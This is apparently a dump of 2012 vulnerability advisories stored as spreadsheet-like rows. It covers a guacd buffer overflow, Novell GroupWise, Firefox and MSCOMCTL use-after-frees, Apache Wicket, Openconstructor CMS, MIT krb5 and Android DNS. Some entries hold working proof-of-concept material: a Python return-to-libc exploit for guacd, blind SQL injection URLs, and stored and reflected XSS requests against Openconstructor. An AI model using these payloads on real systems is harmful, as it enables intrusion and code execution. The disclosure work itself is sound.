guacamole 0.6.0 contains a trivial buffer overflow vulnerability that
allows connected users to execute code with the privileges of the guacd
daemon. In the Debian distribution the guacd 0.6.0-1 daemon runs as root
and allows connections from unauthenticated users. However, it
fortunately only listens on localhost by default.
Analysis
========
The server part of guacamole consists of a web application written in
Java and a proxy daemon (""guacd"") written in C. The proxy part parses
the guacamole protocol using the libguac library. This library contains
a trivial buffer overflow vulnerability. As you can see in the following
quote the code fails to validate the length of the user supplied input
before using strcpy to copy it to a fixed size buffer in stack:
guac_client_plugin* guac_client_plugin_open(const char* protocol) {
guac_client_plugin* plugin;
/* Reference to dlopen()'d plugin */
void* client_plugin_handle;
/* Client args description */
const char** client_args;
/* Pluggable client */
char protocol_lib[256] = ""libguac-client-"";
union {
guac_client_init_handler* client_init;
void* obj;
} alias;
/* Add protocol and .so suffix to protocol_lib */
strcat(protocol_lib, protocol);
strcat(protocol_lib, "".so"");
/* Load client plugin */
client_plugin_handle = dlopen(protocol_lib, RTLD_LAZY);
if (!client_plugin_handle) {
guac_error = GUAC_STATUS_BAD_ARGUMENT;
guac_error_message = dlerror();
return NULL;
Timeline
========
2012-08-23 Vulnerability discovered and reported to upstream
2012-08-23 Upstream fixes the issue in http://guac-dev.org/trac/changeset/7dcefa744b4a38825619c00ae8b47e5bae6e38c0/libguac
2012-09-12 Fixed version (libguac 0.6.0-2) is uploaded to Debian
2012-09-19 Upstream releases 0.6.3 that includes the fix
Proof of concept
================
#!/usr/bin/python
# CVE-2012-4415: PoC for guacd buffer overflow vulnerability
#
# Copyright (c) 2012 Timo Juhani Lindfors <timo.lindfors iki fi>
#
# Allows arbitrary code execution on Debian i386 guacd 0.6.0-1 with
# default configuration. Uses return-to-libc to bypass non-executable
# stack.
#
import socket, struct
PROTOCOL_ADDRESS = 0xbf807e9f
SYSTEM_ADDRESS = 0xb76e7640
class GuacdPOC:
def __init__(self, command):
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
self.sock.connect(('localhost', 4822))
self.s(""select"")
self.c("","")
protocol = (command + ""; "" + ""#"" * 265)[:265]
protocol += struct.pack(""L"", PROTOCOL_ADDRESS)
protocol += struct.pack(""L"", SYSTEM_ADDRESS)
self.s(protocol)
self.c("";"")
def s(self, x):
self.sock.send(""%d.%s"" % (len(x), x))
def c(self, x):
self.sock.send(x)
GuacdPOC(""touch /tmp/owned"")"
9656,DDIVRT-2012-42 Novell GroupWise Agents Arbitrary File Retrieval (CVE-2012-0419),,CVE-2012-0419,"Title
-----
DDIVRT-2012-42 Novell GroupWise Agents Arbitrary File Retrieval (CVE-2012-0419)
Severity
--------
High
Date Discovered
---------------
April 2, 2012
Discovered By
-------------
Digital Defense, Inc. Vulnerability Research Team
Credit: r@b13$
Vulnerability Description
-------------------------
The HTTP interfaces for Novell GroupWise 8.0.2 Post Office Agent,
Message Transfer Agent, and GroupWise Internet Agent are vulnerable to
an arbitrary file retrieval condition due to a failure to properly
filter certain crafted directory traversal sequences. An
unauthenticated remote attacker can leverage this flaw to retrieve
files with the privileges of the vulnerable agent.
Solution Description
--------------------
Novell has provided solutions for this issue in the form of GroupWise
8.0 SP3 as well as in the latest GroupWise 2012 SP1 release.
http://www.novell.com/support/kb/doc.php?id=7010772
Tested Systems / Software
-------------------------
Novell GroupWise 8.0.2 Post Office Agent
Novell GroupWise 8.0.2 Message Transfer Agent
Novell GroupWise 8.0.2 GroupWise Internet Agent
Vendor Contact
--------------
Vendor Name: Novell
Vendor Website: http://www.novell.com/"
9711,"VUPEN - Mozilla Firefox ""nsHTMLEditRules"" Remote Use-after-free (CVE-2012-3958 / MFSA 2012-58)",,CVE-2012-3958,"VUPEN Security Research - Mozilla Firefox ""nsHTMLEditRules"" Remote
Use-after-free (CVE-2012-3958 / MFSA 2012-58)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Mozilla Firefox is a free and open source web browser and coordinated by
Mozilla Corporation and Mozilla Foundation. As of August 2012, Firefox
has approximately 23% of worldwide usage share of web browsers (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Mozilla Firefox.
The vulnerability is caused by a use-after-free error in the
""setUserData()""
method within the ""nsHTMLEditRules"" class, which could allow remote
attackers execute arbitrary code via a specially crafted web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Mozilla Firefox versions prior to 15
Mozilla Firefox ESR versions prior to 10.0.7
Mozilla Thunderbird versions prior to 15
Mozilla Thunderbird ESR versions prior to 10.0.7
Mozilla SeaMonkey versions prior to 2.12
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
exploit including DEP bypass are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Upgrade to Firefox 15, Firefox ESR 10.0.7, Thunderbird 15, Thunderbird ESR
10.0.7, and SeaMonkey 2.12.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of advanced vulnerability research for
defensive and offensive cyber security. VUPEN solutions enable corporations
and governments to measure and manage risks, eliminate vulnerabilities
before they can be exploited, and protect critical infrastructures and
assets against known and unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://www.mozilla.org/security/announce/2012/mfsa2012-58.html
http://www.vupen.com
X. DISCLOSURE TIMELINE
-----------------------------
2012-07-15 - Vulnerability Discovered by VUPEN and shared with customers
2012-08-28 - Public disclosure"
9712,VUPEN - Microsoft Windows Common Controls MSCOMCTL.OCX Use-after-free (CVE-2012-1856 / MS12-060),,CVE-2012-1856,"VUPEN Security Research - Microsoft Windows Common Controls MSCOMCTL.OCX
Use-after-free (CVE-2012-1856 / MS12-060)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Microsoft Windows is a series of software operating systems and graphical
user interfaces produced by Microsoft. Windows had approximately 90% of
the market share of the client operating systems. (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft products.
The vulnerability is caused by a use-after-free error in the ""TabStrip""
Control within the ""MSCOMCTL.OCX"" component, which could allow remote
attackers execute arbitrary code via a specially crafted web page or
malicious Office document.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Office 2010 Service Pack 1
Microsoft Office 2007 Service Pack 3
Microsoft Office 2007 Service Pack 2
Microsoft Office 2003 Web Components Service Pack 3
Microsoft Office 2003 Service Pack 3
Microsoft Office XP Service Pack 3
Microsoft SQL Server 2008 R2
Microsoft SQL Server 2008
Microsoft SQL Server 2005
Microsoft SQL Server 2000
Microsoft Commerce Server 2009 R2
Microsoft Commerce Server 2009
Microsoft Commerce Server 2007 Service Pack 2
Microsoft Commerce Server 2002 Service Pack 4
Microsoft Host Integration Server 2004 Service Pack 1
Microsoft Visual FoxPro 8.0 Service Pack 1
Microsoft Visual FoxPro 9.0 Service Pack 2
Microsoft Visual Basic 6.0 Runtime
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a fully functional
exploit including ASLR/DEP bypass are available through the VUPEN BAE
(Binary Analysis & Exploits) portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code
audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the
vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply MS12-060 security updates.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the leading provider of advanced vulnerability research for
defensive and offensive cyber security. VUPEN solutions enable corporations
and governments to measure and manage risks, eliminate vulnerabilities
before they can be exploited, and protect critical infrastructures and
assets against known and unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://technet.microsoft.com/en-us/security/bulletin/ms12-060
http://www.vupen.com
X. DISCLOSURE TIMELINE
-----------------------------
2010-09-06 - Vulnerability Discovered by VUPEN and shared with customers
2012-08-14 - Public disclosure"
9730,[CVE-2012-3373] Apache Wicket XSS vulnerability via manipulated URL parameter,,CVE-2012-3373,"Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Apache Wicket 1.4.x and 1.5.x
Description:
https://wicket.apache.org/2012/09/06/cve-2012-3373.html
It is possible to inject JavaScript statements into an ajax link by
adding an encoded null byte to a URL pointing to a Wicket app. This
could be done by sending a legitimate user a manipulated URL and
tricking the user into clicking on it.
This vulnerability is fixed in
- Apache Wicket 1.4.21
https://wicket.apache.org/2012/09/05/wicket-1.4.21-released.html
- Apache Wicket 1.5.8
https://wicket.apache.org/2012/08/24/wicket-1.5.8-released.html
Apache Wicket 6.0.0 is not affected.
Credit:
This issue was reported by Thomas Heigl.
Apache Wicket Team"
9944,[CVE-2012-3873] Openconstructor CMS 3.12.0 'id' parameter multiple SQL injection vulnerabilities,,CVE-2012-3873,"###Title###:
Openconstructor CMS 3.12.0 'id' parameter multiple SQL injection vulnerabilities
###Affected Software###:
http://www.openconstructor.org/
http://code.google.com/p/openconstructor/downloads/list
http://esectorsolutions.com/about/whats-new/esector-news/detailed/?id=234
###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP.
Multiple SQL injection vulnerabilities exist on the 'id' parameter, which is used across different sections of the application.
Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.
###CVE###
CVE-2012-3873
###Impact###:
Authenticated attackers can execute arbitrary SQL queries.
CVSS Base Score: 9.0 (AV:N/AC:L/Au:S/C:C/I:C/A:C)
###Credits###:
Lorenzo Cantoni
###Details###:
The following lines of code are the cause of the issue:
ds->get_record($_GET['id'])
get_record() perform a query on the database, without checking the user supplied data in the 'id' parameter. The following pages are vulnerable:
data/gallery/edit.php
data/guestbook/edit.php
data/file/edit.php
data/htmltext/edit.php
data/publication/edit.php
data/event/edit.php
'getimage/showimage.php' is also vulnerable, due to the following lines of code:
$res = $db->query(
'SELECT id, name, filename, size, type, date'.
' FROM dsfile'.
' WHERE id='.$_GET['id']
);
###Proof of Concept###:
An object (eg:gallery object, file object, guestbook object ...) must first be created or has to already exist in order to exploit the vulnerability.
For instance, if a guestbook object has been created, an attacker can open it in edit page and exploit a blind SQL injection as follows:
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a FALSE value for the query
In my test environment, I have been able to confirm the possibility to execute queries with the following commands:
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-log' #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-foo' #returns a FALSE value for the query
On 'getimage/showimage.php', an image file must be first successfully uploaded. The exploitation is very similar:
http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-foo' # returns a FALSE value for the query
http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-log' # return a TRUE value for the query
###Disclosure###
[08/07/2012] Lead Developer contacted.
[22/07/2012] No response. Sent another mail.
[04/08/2012] Still no response. Public disclosure."
9945,"[CVE-2012-3871] Openconstructor CMS 3.12.0 'data/hybrid/i_hybrid.php', 'header' parameter Stored Cross-site Scripting Vulnerability",,CVE-2012-3871,"###Title###:
Openconstructor CMS 3.12.0 'data/hybrid/i_hybrid.php', 'header' parameter Stored Cross-site Scripting Vulnerability
###Affected Software###:
http://www.openconstructor.org/
http://code.google.com/p/openconstructor/downloads/list
http://esectorsolutions.com/about/whats-new/esector-news/detailed/?id=234
###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP. A stored XSS vulnerability exist on the 'header' parameter passed to 'i_hybrid.php' page, which is used when creating a new document in the catalogue section.
Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.
###CVE###
CVE-2012-3871
###Impact###:
Authenticated attackers can plant malicious javascript in the web application, with the aim to execute it on the other user's browser.
CVSS Base Score: 4.9 (AV:N/AC:M/Au:S/C:P/I:P/A:N)
###Credits###:
Lorenzo Cantoni
###Details###:
When creating a new document in the catalogue section, the application asks to set a name for that object.
The application does not escape the html tags correctly for these parameters. The vulnerability has been tested on an Internet Explorer 7 browser (because the application is designed to work with IE). Newer version of the browser with the anti-xss filter enabled, may help to protect users from such attacks.
'data/hybrid/i_hybrid.php' contains the following code:
$doc->readValues($_POST);
$doc->readFiles($_FILES);
$ds->createDocument($doc);
readValues() does not escape dangerous html carachters, so they are passed to createDocument() which store all the attributes in the database.
When the user reach the main 'Catalogue' section, the XSS is triggered.
###Proof of Concept####:
Here is a trace of the required POST to plant the javascript
POST /openconstructor/data/hybrid/i_hybrid.php HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*
Referer: http://10.0.2.15/openconstructor/data/hybrid/edit.php?0=-1&id=new&ds_id=11
Accept-Language: it
Content-Type: multipart/form-data; boundary=---------------------------7dc262a2803fa
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Proxy-Connection: Keep-Alive
Host: 10.0.2.15
Pragma: no-cache
Cookie: curnode=12; vf[img_intro]=disabled; def_bs0=rating; dsh=11; PHPSESSID=s8fnmtbfv0h1ofdeotu4h75p33; wcsUserLogin=root; wcsUserName=Administrator
Content-Length: 857
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""action""
create_hybrid
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""ds_id""
11
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""id""
new
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""hybridid""
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""fieldid""
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""callback""
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""header""
<script>alert('xss')</script>
-----------------------------7dc262a2803fa
Content-Disposition: form-data; name=""published""
0
-----------------------------7dc262a2803fa--
###Disclosure###
[08/07/2012] Lead Developer contacted.
[22/07/2012] No response. Sent another mail.
[04/08/2012] Still no response. Public disclosure."
9946,[CVE-2012-3872] Openconstructor CMS 3.12.0 Multiple Reflected Cross-site Scrpting vulnerabilities,,CVE-2012-3872,"###Title###:
Openconstructor CMS 3.12.0 Multiple Reflected Cross-site Scrpting vulnerabilities
###Affected Software###:
http://www.openconstructor.org/
http://code.google.com/p/openconstructor/downloads/list
http://esectorsolutions.com/about/whats-new/esector-news/detailed/?id=234
###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP. Multiple Reflected XSS vulnerabilities exist on different parameters of differnt pages.
Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.
###CVE###
CVE-2012-3872
###Impact###:
Attackers can execute malicious javascript in authenticated users's browser, through social engineering techniques.
CVSS Base Score: 4.0 (AV:N/AC:H/Au:N/C:P/I:P/A:N)
###Credits###:
Lorenzo Cantoni
###Details###:
Vulnerabilities has been tested on Internet Explorer 7, as the application is designed to work with that browser. Newer version of the browser with the anti-xss filter enabled, may help to protect users from such attacks.
###Proof of Concept###:
1) http://hostname/openconstructor/data/file/edit.php?result=<script>alert('xss')</script>&id=new&ds_id=8&hybridid=&fieldid=&callback=&type=txt&name=test&description=test&fname=test&create=Save
Note: The right 'ds_id' must be set for an existing object.
2) http://hostname/openconstructor/confirm.php?q=<script>alert('XSS')</script>skin=metallic
3) http://hostname/openconstructor/users/users.php?type=multiple&keyword=<script>alert('xss')</script>
###Disclosure###
[08/07/2012] Lead Developer contacted.
[22/07/2012] No response. Sent another mail.
[04/08/2012] Still no response. Public disclosure."
9947,"[CVE-2012-3870] Openconstructor CMS 3.12.0 'createobject.php', 'name' and 'description' parameters Stored Cross-site Scrpting vulnerabilities",,CVE-2012-3870,"###Title###:
Openconstructor CMS 3.12.0 'createobject.php', 'name' and 'description' parameters Stored Cross-site Scrpting vulnerabilities
###Affected Software###:
http://www.openconstructor.org/
http://code.google.com/p/openconstructor/downloads/list
http://esectorsolutions.com/about/whats-new/esector-news/detailed/?id=234
###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP. Stored XSS vulnerabilities exist on the 'name' and 'description'
parameters, which are used as properties when creating a new object. Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.
###CVE###
CVE-2012-3870
###Impact###:
Authenticated attackers can plant malicious javascript in the web application, with the aim to execute it on the other user's browser.
CVSS Base Score: 4.9 (AV:N/AC:M/Au:S/C:P/I:P/A:N)
###Credits###:
Lorenzo Cantoni (lorenzo[dot]cantoni86[at]gmail[dot]com)
###Details###:
When creating a new object in the ""object"" section, the application asks to set a name and a description for that object.
The application does not escape the html tags correctly for these parameters. The vulnerability has been tested on an Internet Explorer 7 browser (because the application is designed
to work with IE). Newer version of the browser with the anti-xss filter enabled, may help to protect users from such attacks.
'createobject.php' contains multiple lines of code (for the various kind of objects) with code similar to the following one:
$obj->name = $_POST['name'];
$obj->description = $_POST['description'];
$result = ObjManager::create($obj);
$obj with name and description attributes is passed to ObjManager::create() function without HTML escaping.
When the user access the ""Object"" section and list the objects with a malicious name or description, will trigger the exploit. Additionally, if the object can be published,
the exploit can be triggered also in the ""Sitemap"" section.
###Proof of Concept###:
Here is a trace of the required POST to plant the javascript
POST /openconstructor/objects/createobject.php HTTP/1.1
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*
Referer: http://10.0.2.15/openconstructor/objects/createobject.php?ds_type=htmltext&obj_type=htmltextbody
Accept-Language: it
Content-Type: application/x-www-form-urlencoded
UA-CPU: x86
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Proxy-Connection: Keep-Alive
Host: 10.0.2.15
Pragma: no-cache
Cookie: curnode=htmltextbody; PHPSESSID=s8fnmtbfv0h1ofdeotu4h75p33; wcsUserLogin=root; wcsUserName=Administrator
Content-Length: 141
ds_type=htmltext&obj_type=htmltextbody&name=xssed+%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E&description=asd&ds_id=3&createobject=Create
###Disclosure###
[08/07/2012] Lead Developer contacted.
[22/07/2012] No response. Sent another mail.
[04/08/2012] Still no response. Public disclosure."
9974,MITKRB5-SA-2012-001: KDC heap corruption and crash [CVE-2012-1014 CVE-2012-1015],,CVE-2012-1014,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2012-001
MIT krb5 Security Advisory 2012-001
Original release: 2012-07-31
Topic: KDC heap corruption and crash vulnerabilities
CVE-2012-1015: KDC frees uninitialized pointer
CVSSv2 Vector: AV:N/AC:M/Au:N/C:C/I:C/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 9.3
Access Vector: Network
Access Complexity: Medium
Authentication: None
Confidentiality Impact: Complete
Integrity Impact: Complete
Availability Impact: Complete
CVSSv2 Temporal Score: 7.3
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
CVE-2012-1014: KDC dereferences uninitialized pointer
CVSSv2 Vector: AV:N/AC:L/Au:N/C:P/I:P/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 9
CVSSv2 Temporal Score: 7
SUMMARY
=======
CVE-2012-1015: The MIT krb5 KDC (Key Distribution Center) daemon can
free an uninitialized pointer while processing an unusual AS-REQ,
corrupting the process heap and possibly causing the daemon to
abnormally terminate. An attacker could use this vulnerability to
execute malicious code, but exploiting frees of uninitialized pointers
to execute code is believed to be difficult. It is possible that a
legitimate client that is misconfigured in an unusual way could
trigger this vulnerability.
CVE-2012-1014: The MIT krb5 KDC daemon can dereference an
uninitialized pointer while processing a malformed AS-REQ, causing the
daemon to abnormally terminate. This vulnerability could
theoretically lead to the execution of malicious code, but that is
believed to be very difficult.
No known exploit exists that is capable of executing malicious code
for either vulnerability, but it is also not difficult to trigger a
denial of service with either vulnerability.
IMPACT
======
CVE-2012-1015: By sending a specially crafted AS-REQ, an
unauthenticated remote attacker can cause the KDC to abnormally
terminate or to execute malicious code.
CVE-2012-1014: By sending a malformed AS-REQ, an unauthenticated
remote attacker can cause the KDC to abnormally terminate. It is
theoretically possible, but unlikely, for this vulnerability to lead
to the execution of malicious code.
AFFECTED SOFTWARE
=================
* The KDC in releases krb5-1.8 and later is vulnerable to
CVE-2012-1015.
* The KDC in releases krb5-1.10 and later is vulnerable to
CVE-2012-1014.
* Some platforms detect attempts to free invalid pointers and
protectively terminate the process, preventing arbitrary code
execution on those platforms.
FIXES
=====
* The upcoming krb5-1.10.3 release will contain a fix for
CVE-2012-1014 and CVE-2012-1015.
* The upcoming krb5-1.9.5 release will contain a fix for
CVE-2012-1015.
* Apply the following patch:
diff --git a/src/kdc/do_as_req.c b/src/kdc/do_as_req.c
index 23623fe..8ada9d0 100644
- --- a/src/kdc/do_as_req.c
+++ b/src/kdc/do_as_req.c
@@ -463,7 +463,7 @@ process_as_req(krb5_kdc_req *request, krb5_data *req_pkt,
krb5_enctype useenctype;
struct as_req_state *state;
- - state = malloc(sizeof(*state));
+ state = calloc(sizeof(*state), 1);
if (!state) {
(*respond)(arg, ENOMEM, NULL);
return;
@@ -486,6 +486,7 @@ process_as_req(krb5_kdc_req *request, krb5_data *req_pkt,
state->authtime = 0;
state->c_flags = 0;
state->req_pkt = req_pkt;
+ state->inner_body = NULL;
state->rstate = NULL;
state->sname = 0;
state->cname = 0;
diff --git a/src/kdc/kdc_preauth.c b/src/kdc/kdc_preauth.c
index 9d8cb34..d4ece3f 100644
- --- a/src/kdc/kdc_preauth.c
+++ b/src/kdc/kdc_preauth.c
@@ -1438,7 +1438,8 @@ etype_info_helper(krb5_context context, krb5_kdc_req *request,
continue;
}
- - if (request_contains_enctype(context, request, db_etype)) {
+ if (krb5_is_permitted_enctype(context, db_etype) &&
+ request_contains_enctype(context, request, db_etype)) {
retval = _make_etype_info_entry(context, client->princ,
client_key, db_etype,
&entry[i], etype_info2);
diff --git a/src/kdc/kdc_util.c b/src/kdc/kdc_util.c
index a43b291..94dad3a 100644
- --- a/src/kdc/kdc_util.c
+++ b/src/kdc/kdc_util.c
@@ -2461,6 +2461,7 @@ kdc_handle_protected_negotiation(krb5_data *req_pkt, krb5_kdc_req *request,
return 0;
pa.magic = KV5M_PA_DATA;
pa.pa_type = KRB5_ENCPADATA_REQ_ENC_PA_REP;
+ memset(&checksum, 0, sizeof(checksum));
retval = krb5_c_make_checksum(kdc_context,0, reply_key,
KRB5_KEYUSAGE_AS_REQ, req_pkt, &checksum);
if (retval != 0)
diff --git a/src/lib/kdb/kdb_default.c b/src/lib/kdb/kdb_default.c
index c4bf92e..367c894 100644
- --- a/src/lib/kdb/kdb_default.c
+++ b/src/lib/kdb/kdb_default.c
@@ -61,6 +61,9 @@ krb5_dbe_def_search_enctype(kcontext, dbentp, start, ktype, stype, kvno, kdatap)
krb5_boolean saw_non_permitted = FALSE;
ret = 0;
+ if (ktype != -1 && !krb5_is_permitted_enctype(kcontext, ktype))
+ return KRB5_KDB_NO_PERMITTED_KEY;
+
if (kvno == -1 && stype == -1 && ktype == -1)
kvno = 0;
This patch is also available at
http://web.mit.edu/kerberos/advisories/2012-001-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2012-001-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2012-001.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2012-1014
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1014
CVE: CVE-2012-1015
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-1015
ACKNOWLEDGMENTS
===============
We thank Emmanuel Bouillon (NCI Agency) for discovering and reporting
these vulnerabilities.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/07566CE5 2012-01-27 [expires: 2013-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
CVE-2012-1015: KDC frees uninitialized pointer
The KDC function kdc_handle_protected_negotiation(), which handles the
protected negotiation feature of the FAST Kerberos protocol extension,
can attempt to create a checksum using a key type that is invalid for
producing checksums. This causes its call to krb5_c_make_checksum()
to fail, which leads to the cleanup code in
kdc_handle_protected_negotiation() freeing an uninitialized pointer.
It is possible, but unlikely, for a legitimate client to be
misconfigured in a way that causes the KDC to attempt to use such an
invalid key type in this code.
CVE-2012-1014: KDC dereferences uninitialized pointer
CVSSv2 Vector: AV:N/AC:L/Au:N/C:P/I:P/A:C/E:POC/RL:OF/RC:C
CVSSv2 Base Score: 9
Access Vector: Network
Access Complexity: Low
Authentication: None
Confidentiality Impact: Partial
Integrity Impact: Partial
Availability Impact: Complete
CVSSv2 Temporal Score: 7
Exploitability: Proof-of-Concept
Remediation Level: Official Fix
Report Confidence: Confirmed
The KDC function process_as_req(), which handles incoming AS-REQ
messages, allocates a state object using malloc() and initializes many
fields within it. It fails to initialize state->inner_body, which is
a pointer to a krb5_data object. If the uninitialized value
state->inner_body is not null, a failure in process_as_req() that
precedes the call to kdc_find_fast() could cause error handling code
in finish_process_as_req() to pass the uninitialized state->inner_body
pointer to krb5_free_data(), which would proceed to dereference the
uninitialized pointer. The typical outcome is KDC process termination
due to a segmentation fault or similar memory fault.
It is theoretically possible for an attacker to manipulate the
contents of the heap so that the uninitialized pointer
state->inner_body would point to valid memory where
state->inner_body->data contains an attacker-chosen invalid pointer
value. The krb5_free_data() function would then pass this invalid
pointer to free(). This could allow the attacker to overwrite memory
or execute malicious code on some platforms, depending on the details
of the malloc() implementation. This indirect attack method seems
much less likely to succeed than one where the attacker could directly
control the invalid pointer value that the program passes to free().
REVISION HISTORY
================
2012-07-31 original release
Copyright (C) 2012 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iEYEARECAAYFAlAYHFcACgkQSO8fWy4vZo6GswCgi1sNmgLekPTxnHgOaiEmKeVF
1TMAn2EoBKvxZBWhNTISWjM1jcV7sHrU
=8oTe
-----END PGP SIGNATURE-----"
10005,Android DNS poisoning: Randomness gone bad (CVE-2012-2808),,CVE-2012-2808,"1 Introduction
===========
Recently we discovered a very interesting vulnerability in Android’s
DNS resolver,
a weakness in its pseudo-random number generator (PRNG), which makes
DNS poisoning
attacks feasible.
The full advisory can be found at http://bit.ly/MkteBx
A blog post can be found at http://bit.ly/MkoU5j
Demo of our PoC can be found at http://youtu.be/ffnF7Jej7l0
2 Vulnerability
============
The PRNG that the DNS resolver uses is
random_id = 0xffff & (time_usec ^ time_sec ^ pid)
where time_sec is the current time in seconds, time_usec is the microseconds
